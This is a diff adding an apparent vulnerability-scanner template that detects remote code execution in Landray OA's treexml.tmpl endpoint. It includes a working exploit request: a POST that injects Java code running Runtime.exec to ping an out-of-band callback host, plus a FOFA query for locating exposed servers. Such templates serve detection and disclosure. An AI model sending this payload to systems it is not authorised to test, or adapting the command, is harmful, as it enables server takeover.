@@ -1,0 +1,46 @@
+id: landray-oa-treexml-rce
+
+info:
+  name: Landray OA Treexml.tmpl - Remote Code Execution
+  author: tangxiaofeng7,SleepingBag945
+  severity: high
+  description: |
+    There is a remote command execution vulnerability in Lanling OA treexml.tmpl. An attacker can obtain server permissions by sending a specific request package.
+  reference:
+    - https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce/blob/main/landray-oa-treexml-rce.yaml
+    - https://vuls.info/PeiQi/wiki/oa/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20treexml.tmpl%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="Landray-OA系统"
+  tags: landray,oa,treexml,rce
+
+http:
+  - raw:
+      - |
+        POST /data/sys-common/treexml.tmpl HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Content-Type: application/x-www-form-urlencoded
+
+        s_bean=ruleFormulaValidate&script=try {String cmd = "ping {{interactsh-url}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - "<RestResponse><success>"
+          - "<confirm>"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4b0a0048304602210096f0ba9e6a94142423797bf77a9ada7c90c4b3df0f7a5da5c7f3dca65655cee60221009eaf25bf39f22f5cc51eb59c17943967a388d54fe9aa843d341a6ef2af2af5ce:922c64590222798bb761d5b6d8e72950
